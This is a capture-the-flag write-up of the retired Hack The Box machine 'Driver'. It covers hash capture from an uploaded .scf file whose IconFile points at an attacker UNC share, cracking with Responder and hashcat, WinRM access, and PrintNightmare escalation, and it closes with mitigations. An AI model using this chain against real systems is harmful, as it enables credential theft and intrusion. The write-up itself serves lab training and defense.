---
machine: Driver
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, scf, responder, ntlm, winrm, printnightmare]
---

# Driver — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A ticket portal accepts a `.scf` file pointing to a UNC resource. When opened, Windows sends a NetNTLMv2 hash to Responder; the hash is cracked and provides WinRM. The Windows version is vulnerable to PrintNightmare and yields SYSTEM.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p80,135,139,445,5985 <IP>
```

- IIS, SMB, RPC and WinRM.
- The portal allows file attachments to tickets.
- The server leaks the Windows version.

## Enumeration

- Upload a `.scf` containing `IconFile=\\<ATTACKER>\share\icon.ico`.
- Start Responder on the lab interface.
- The server requests the resource and sends a NetNTLMv2 hash.
- Crack the hash with a wordlist and validate it against WinRM.

## Foothold

Upload the file, wait for the connection and capture the hash. Use the recovered password to access WinRM as the service user.

```bash
responder -I <IFACE> -wv
hashcat -m 5600 hash.txt <WORDLIST>
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

## Privilege escalation

Check the version and spooler state. PrintNightmare loads a driver and executes code as SYSTEM using the obtained credentials.

```powershell
Get-Service Spooler
whoami /priv
```

## Evidence

- `.scf` file accepted.
- Captured NetNTLMv2 hash.
- WinRM session.
- SYSTEM execution through PrintNightmare.

## Lessons

- Files with UNC paths leak hashes when opened.
- A ticket portal is an upload surface.
- NetNTLMv2 can be cracked when the password is weak.
- PrintNightmare persists on unpatched systems.

## Mitigations and detection

- Block `.scf` files and outbound UNC paths.
- Patch PrintNightmare and disable the spooler when unused.
- Use managed credentials and long passwords.
- Alert on SMB connections from servers to external hosts.
- References: CVE-2021-1675, CVE-2021-34527, HTB Driver.

## References

- <https://www.hackthebox.com/machines/Driver>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-34527>
- <https://attack.mitre.org/techniques/T1187/>
- <https://attack.mitre.org/techniques/T1068/>
